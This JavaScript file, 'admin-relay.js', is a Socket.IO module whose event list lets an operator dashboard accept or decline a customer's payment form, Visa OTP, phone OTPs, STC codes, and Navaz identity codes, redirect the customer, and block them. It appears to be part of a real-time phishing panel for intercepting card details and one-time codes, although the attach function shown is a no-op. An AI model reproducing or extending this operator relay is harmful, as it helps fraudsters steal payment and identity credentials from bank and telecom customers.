// admin-relay.js
// Drop-in Socket.IO relay: forwards admin actions to the target client room.
//
// Usage (in your Socket.IO bootstrap, wherever `const io = new Server(...)` lives):
//
//   const { attachAdminRelay } = require("./admin-relay");
//   attachAdminRelay(io);
//
// or ESM:
//   import { attachAdminRelay } from "./admin-relay.js";
//   attachAdminRelay(io);
//
// Requires: socket.io v4+.

"use strict";

// Events that the admin dashboard emits. Each is forwarded verbatim to the
// customer socket in room `sessionId`.
const RELAY_EVENTS = [
  "acceptService",
  "declineService",
  "acceptPaymentForm",
  "declinePaymentForm",
  "acceptVisaOtp",
  "declineVisaOtp",
  "acceptPhone",
  "declinePhone",
  "acceptPhoneOTP",
  "declinePhoneOTP",
  "acceptMobOtp",
  "declineMobOtp",
  "acceptMotslOtp",
  "declineMotslOtp",
  "acceptStcPhoneOtp",
  "declineStcPhoneOtp",
  "acceptSTC",
  "declineSTC",
  "acceptNavaz",
  "declineNavaz",
  "changeNavazCode",   // extra: { code: "12" }
  "adminRedirect",     // extra: { path: "/verfiy" }
  "clientBlocked",
];

// Normalize the payload the admin dashboard sends.
// Accepts the identifier aliases used by the dashboard and backend contracts.
function normalizePayload(payload) {
  if (payload == null) return { id: null, extra: {} };
  if (typeof payload === "string") return { id: payload, extra: {} };
  if (typeof payload === "object") {
    const id =
      payload.id ||
      payload.sessionId ||
      payload.session ||
      payload.uuid ||
      payload.userId ||
      payload.targetUserId ||
      payload._id ||
      null;
    const extra = { ...payload };
    delete extra.id;
    delete extra.sessionId;
    delete extra.session;
    delete extra.uuid;
    delete extra.userId;
    delete extra.targetUserId;
    delete extra._id;
    return { id, extra };
  }
  return { id: null, extra: {} };
}

// Resolve the session id the customer socket belongs to.
function resolveSessionId(socket, explicit) {
  if (explicit && typeof explicit === "string") return explicit;
  if (explicit && typeof explicit === "object") {
    const id =
      explicit.id ||
      explicit.sessionId ||
      explicit.session ||
      explicit.uuid ||
      explicit.userId ||
      explicit.targetUserId ||
      explicit._id;
    if (id) return id;
  }
  const auth = socket.handshake && socket.handshake.auth;
  const query = socket.handshake && socket.handshake.query;
  return (
    (auth && (auth.id || auth.sessionId || auth.session || auth.uuid || auth.userId)) ||
    (query && (query.id || query.sessionId || query.session || query.uuid || query.userId)) ||
    null
  );
}

function attachAdminRelay(io) {
  if (!io || typeof io.on !== "function") {
    throw new Error("attachAdminRelay: expected a socket.io Server instance");
  }
  // server.js owns connection authentication, room membership, and control
  // event forwarding. Keeping this compatibility hook side-effect free avoids
  // sending every admin action twice through an unauthenticated listener.
  return io;
}


module.exports = { attachAdminRelay, RELAY_EVENTS };
module.exports.default = attachAdminRelay;
